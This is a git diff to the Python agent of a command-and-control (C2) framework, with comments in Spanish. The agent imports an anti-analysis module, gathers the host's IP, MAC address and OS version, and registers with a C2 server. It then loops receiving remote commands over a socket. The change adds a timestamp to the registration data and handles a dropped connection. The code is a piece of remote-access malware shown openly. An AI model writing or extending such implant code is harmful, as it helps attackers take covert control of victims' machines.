@@ -5,6 +5,7 @@ import json
 import platform
 import antianalysis
 import subprocess
+from datetime import datetime
 
 SERVER_IP = "127.0.0.1"
 HTTP_PORT = 5000
@@ -41,13 +42,15 @@ def register_agent():
     mac = antianalysis.get_mac_address() # Obtener MAC 
     so = platform.system() + " " + platform.version() # Obtener S.O y versión 
     private_key = load_private_key() # Cargar clave privada
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Obtener fecha y hora actuales
     # URL para registrar agente en C2
     server_url = f"{BASE_C2_URL}/register_agent" 
     # Datos a enviar al servidor
     data = {
         'ip': ip,
         'mac': mac,
-        'so': so 
+        'so': so, 
+        'timestamp': timestamp
     }
     # Datos a enviar al servidor
     files = {
@@ -95,6 +98,9 @@ def connect_to_c2_server():
 
         while True:
             command = agent_socket.recv(1024).decode('utf-8')
+            if not command:
+                    print("Servidor cerró la conexión.")
+                    break
             if command.lower() == "exit":
                 break
             if command:
